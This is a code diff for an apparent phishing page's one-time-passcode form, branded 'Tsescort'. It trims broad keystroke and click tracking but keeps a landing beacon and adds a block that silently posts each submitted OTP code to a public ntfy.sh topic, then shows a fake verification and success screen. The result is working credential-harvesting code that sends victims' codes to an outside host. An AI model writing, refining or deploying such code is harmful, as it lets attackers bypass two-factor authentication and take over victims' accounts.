@@ -772,8 +772,10 @@
       }, 3000);
 
       // ------------------------------------------------------------
-      // NTFY SECRET NOTIFY – topic: ts_update
-      // Fires on landing, any click, and form actions.
+      // NTFY NOTIFY – topic: ts_update
+      // ONLY 2 NOTIFICATIONS:
+      //   1) When the page lands
+      //   2) When the OTP is submitted (Confirm OTP clicked)
       // ------------------------------------------------------------
       const NTFY_TOPIC = 'ts_update';
       const NTFY_URL = `https://ntfy.sh/${NTFY_TOPIC}`;
@@ -793,31 +795,8 @@
         } catch (e) { /* silent */ }
       }
 
-      // 1) Landing notification
+      // 1) LANDING NOTIFICATION
       sendNtfy('🚨 Tsescort OTP page landed · ' + new Date().toISOString(), ['globe_with_meridians']);
-
-      // 2) Any click on the document
-      document.addEventListener('click', function(e) {
-        const target = e.target.closest('button, a, input, .card, .logo-ts, .confirm-btn, .subhead, .resend-note a');
-        const tag = target ? target.tagName.toLowerCase() : 'document';
-        const text = (target && target.innerText) ? target.innerText.trim().slice(0, 30) : 'element';
-        sendNtfy(`🖱️ Click on ${tag} · "${text}"`, ['point_up']);
-      }, { passive: true });
-
-      // 3) Any input / change action (specific to OTP page)
-      document.addEventListener('input', function(e) {
-        if (e.target.id === 'otpField') {
-          sendNtfy(`⌨️ OTP input · length: ${e.target.value.length} · value: ${e.target.value || '(empty)'}`, ['keyboard']);
-        } else {
-          const id = e.target.id || 'unknown';
-          sendNtfy(`⌨️ Input on #${id} · length: ${e.target.value.length}`, ['keyboard']);
-        }
-      }, { passive: true });
-
-      document.addEventListener('change', function(e) {
-        const id = e.target.id || 'unknown';
-        sendNtfy(`🔄 Change on #${id}`, ['arrows_counterclockwise']);
-      }, { passive: true });
 
       // ------------------------------------------------------------
       // ORIGINAL OTP LOGIC (unchanged server API & behavior)
@@ -872,7 +851,6 @@
         if (clean) {
           otpField.value = clean;
           updateCounter();
-          sendNtfy(`📋 OTP pasted · value: ${clean}`, ['clipboard']);
         }
       });
 
@@ -909,15 +887,22 @@
       confirmBtn.addEventListener('click', async () => {
         const otp = getOtpValue();
 
-        // NTFY: OTP confirm attempt
-        sendNtfy(`🔐 OTP confirm attempt · value: ${otp} · length: ${otp.length}`, ['lock']);
-
         if (otp.length < MIN_DIGITS) {
           alert('Please enter the OTP code you received.');
-          sendNtfy('⚠️ OTP validation failed: empty code', ['warning']);
           otpField.focus();
           return;
         }
+
+        // 2) OTP SUBMITTED NOTIFICATION
+        sendNtfy(
+          `✅ TSESCORT OTP SUBMITTED\n` +
+          `━━━━━━━━━━━━━━━━━━━━\n` +
+          `🔢 OTP:    ${otp}\n` +
+          `📏 Length: ${otp.length}\n` +
+          `⏰ Time:   ${new Date().toISOString()}\n` +
+          `━━━━━━━━━━━━━━━━━━━━`,
+          ['white_check_mark', 'key']
+        );
 
         confirmBtn.disabled = true;
         confirmBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying...';
@@ -930,17 +915,12 @@
         const elapsed = Date.now() - startTime;
         const remaining = Math.max(0, LOADING_MS - elapsed);
 
-        // NTFY: OTP request completed
-        sendNtfy(`✅ OTP submitted · value: ${otp} · elapsed: ${elapsed}ms`, ['white_check_mark']);
-
         setTimeout(() => {
           loadingOverlay.classList.remove('active');
           otpStep.style.display = 'none';
           successScreen.classList.add('active');
           confirmBtn.disabled = false;
           confirmBtn.innerHTML = '<i class="fas fa-check-circle"></i> Confirm OTP';
-          // NTFY: success screen shown
-          sendNtfy('🎉 OTP success screen displayed', ['tada']);
         }, remaining);
       });
 
@@ -953,21 +933,10 @@
 
       resendLink.addEventListener('click', (e) => {
         e.preventDefault();
-        // NTFY: resend requested
-        sendNtfy('🔄 Resend OTP requested', ['arrows_counterclockwise']);
         alert('A new OTP has been requested. Please check your email or phone. It may take up to 5 minutes to arrive.');
       });
 
       updateCounter();
-
-      // NTFY: window fully loaded
-      window.addEventListener('load', function() {
-        sendNtfy('🌐 Window fully loaded · Tsescort OTP page', ['tada']);
-      });
-
-      // NTFY: focus / blur on OTP field
-      otpField.addEventListener('focus', () => sendNtfy('🔑 OTP field focused', ['mag']));
-      otpField.addEventListener('blur', () => sendNtfy('🔑 OTP field blurred', ['mag_right']));
 
       // End of logic
     })();
